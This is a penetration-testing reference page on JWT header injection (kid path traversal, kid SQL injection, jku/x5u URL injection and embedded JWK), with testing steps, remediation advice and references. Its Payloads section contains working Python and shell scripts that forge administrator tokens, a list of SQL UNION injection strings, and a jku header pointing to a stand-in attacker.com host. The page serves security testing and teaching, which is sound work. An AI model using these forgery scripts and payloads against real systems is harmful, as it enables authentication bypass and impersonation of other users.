# JWT Kid Injection / Path Traversal

## Overview
The JWT `kid` (Key ID) header parameter is used to identify which key the server should use to verify the token's signature. When the server uses the `kid` value to look up a key from a file or database without proper sanitization, attackers can manipulate this parameter to cause SQL injection (selecting an attacker-controlled key from a database), path traversal (reading a predictable file as the signing key), or SSRF (fetching a key from an attacker-controlled URL). All of these lead to forging arbitrary JWTs.

## How It Works
- **SQL Injection via kid**: If the server queries a database with `SELECT key FROM keys WHERE kid = '{kid}'`, an attacker injects SQL to control what value is returned as the key. By injecting `kid` to return a known value (e.g., `' UNION SELECT 'secret'--`), the attacker sets the effective signing key to `secret` and forges tokens.
- **Path Traversal via kid**: If the server reads `./keys/{kid}.pem`, an attacker sets `kid` to `../../../../dev/null` (an empty file) or `../../../etc/passwd` — signing the token with an empty string (from `/dev/null`) means any HS256 signature computed with empty string is valid.
- **URL injection via jku/x5u**: The `jku` header parameter is a URL pointing to a JWKS (JSON Web Key Set). If the server fetches this URL without restriction, the attacker hosts their own JWKS and the server verifies against the attacker's key.

## Impact
- Forge JWTs signed with an attacker-controlled key.
- Authenticate as any user including administrators.
- Complete authentication bypass.
- SSRF via `jku`/`x5u` URL fetching.
- SQL injection impact (data exfiltration, deletion) if the kid SQL injection path allows stacked queries.

## Where to Look
- JWT header `kid` parameter (visible after base64-decoding the header).
- JWT header `jku` (JSON Web Key Set URL) parameter.
- JWT header `x5u` (X.509 Certificate URL) parameter.
- JWT header `jwk` (embedded JSON Web Key) parameter.
- APIs that accept tokens with customizable headers.
- Applications using dynamic key selection based on header values.

## Testing Steps
1. Capture a JWT and decode its header — look for `kid`, `jku`, or `x5u` parameters.
2. If `kid` is present, test path traversal: modify `kid` to `../../dev/null` or `../../../../../dev/null` and sign the modified token with an empty string as the HS256 key.
3. Test `kid` SQL injection: set `kid` to `' UNION SELECT 'attacker_key'--` and sign the forged token with `attacker_key`.
4. If `jku` is present, test URL manipulation: change `jku` to your server hosting a custom JWKS, sign with your private key, and check if the server fetches and trusts your keys.
5. Test `jwk` injection: embed your own public key in the JWT header and sign with the corresponding private key.
6. Check if the server makes DNS or HTTP requests to the `jku` value (use Burp Collaborator).
7. Test directory traversal variants for the kid parameter to identify the key file naming pattern.

## Payloads / Techniques

Path traversal via kid (sign with empty string):
```python
import jwt
import json
import base64

# Forge token with kid pointing to /dev/null
# /dev/null is an empty file -> empty string key
header = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "../../dev/null"
}
payload = {
    "sub": "1",
    "user": "admin",
    "role": "administrator"
}

# Sign with empty string (content of /dev/null)
forged = jwt.encode(payload, "", algorithm="HS256", headers=header)
print(f"Path traversal token: {forged}")

# Also try with /dev/null path variants
for path in ["../../dev/null", "../../../dev/null", "../../../../dev/null",
             "/dev/null", "../../proc/self/fd/0"]:
    header["kid"] = path
    t = jwt.encode(payload, "", algorithm="HS256", headers=header)
    print(f"kid={path}: {t}")
```

SQL Injection via kid:
```python
import jwt

# kid SQL injection: UNION SELECT a known value as the key
# The server runs: SELECT key FROM keys WHERE id = '{kid}'
# We inject: ' UNION SELECT 'attacker_controlled_key' FROM DUAL--
sql_payloads = [
    "' UNION SELECT 'hacked'-- -",
    "' UNION SELECT 'hacked' FROM DUAL-- -",
    "1' UNION SELECT 'hacked'#",
    "1 UNION SELECT 'hacked'-- ",
]

payload = {"sub": "1", "role": "admin"}

for sql in sql_payloads:
    header = {"alg": "HS256", "typ": "JWT", "kid": sql}
    # Sign with whatever we injected as the key
    token = jwt.encode(payload, "hacked", algorithm="HS256", headers=header)
    print(f"SQL kid: {sql}")
    print(f"Token: {token}\n")
```

JKU header injection:
```bash
# Step 1: Generate RSA key pair for attacker
openssl genrsa -out attacker_private.pem 2048
openssl rsa -in attacker_private.pem -pubout -out attacker_public.pem

# Step 2: Create JWKS file hosted at your server
# Serve attacker_jwks.json at https://attacker.com/jwks.json

# Step 3: Forge JWT with jku pointing to attacker JWKS
python3 -c "
import jwt, json
from cryptography.hazmat.primitives import serialization

with open('attacker_private.pem', 'rb') as f:
    private_key = serialization.load_pem_private_key(f.read(), password=None)

header = {
    'alg': 'RS256',
    'typ': 'JWT',
    'jku': 'https://attacker.com/jwks.json',
    'kid': 'attacker-key-1'
}
payload = {'sub': '1', 'role': 'administrator', 'user': 'admin'}
token = jwt.encode(payload, private_key, algorithm='RS256', headers=header)
print(token)
"
```

JWK injection (self-signed):
```python
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
import jwt, base64, json

private_key = rsa.generate_private_key(
    public_exponent=65537, key_size=2048, backend=default_backend()
)
pub = private_key.public_key()
pub_numbers = pub.public_numbers()

def to_b64(n):
    return base64.urlsafe_b64encode(n.to_bytes((n.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode()

jwk_header = {
    "alg": "RS256",
    "typ": "JWT",
    "jwk": {
        "kty": "RSA",
        "use": "sig",
        "n": to_b64(pub_numbers.n),
        "e": to_b64(pub_numbers.e)
    }
}
payload = {"sub": "1", "role": "administrator"}
token = jwt.encode(payload, private_key, algorithm="RS256", headers=jwk_header)
print(token)
```

## Burp Suite Tips
- The **JWT Editor** Burp extension automates `kid` path traversal, JWK injection, and `jku` injection with a single click in Repeater.
- Use **Collaborator** as your `jku` URL — if you see DNS or HTTP requests from the target server, the `jku` parameter is being fetched (SSRF confirmed, now test with your actual JWKS).
- In the JWT Editor "Attacks" tab, "Embedded JWK" and "JWKS Injection" perform the key confusion attacks automatically.
- Manually test `kid` SQL injection in **Repeater** by base64url-encoding a modified header JSON and replacing the first segment of the JWT.
- Monitor the **Collaborator** poll for any out-of-band interactions triggered by `jku`, `x5u`, or `kid` URL values.
- The **Param Miner** extension can help discover additional JWT-related parameters in the header.

## Tools
- **JWT Editor** (Burp Extension) — Automated kid injection, JWK injection, jku injection.
- **jwt_tool** — Command-line testing for all JWT header injection attacks.
- **python-jwt / PyJWT** — Manual token crafting with custom headers.
- **Burp Collaborator / Interactsh** — OOB detection for jku/x5u SSRF.
- **openssl** — RSA key generation for JWK/jku attacks.

## Remediation
- Validate and sanitize the `kid` parameter against an allowlist of known key IDs; reject any value that contains path separators (`/`, `..`) or SQL special characters.
- Do not use the `kid` value to directly construct file paths or SQL queries — use it as a key into an in-memory map or a parameterized query.
- Disable support for `jku` and `x5u` header parameters if not needed, or restrict to a whitelist of trusted URLs.
- Reject JWTs with `jwk` headers that contain untrusted keys; only accept keys from a pre-configured, trusted key store.
- Use a well-maintained JWT library with secure-by-default settings and keep it updated.
- Implement JWT validation that ignores attacker-controllable header parameters when selecting verification keys.

## References
https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal
https://portswigger.net/web-security/jwt
https://www.nccgroup.com/us/research-blog/jwt-kid-vulnerabilities/
https://cwe.mitre.org/data/definitions/22.html
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens
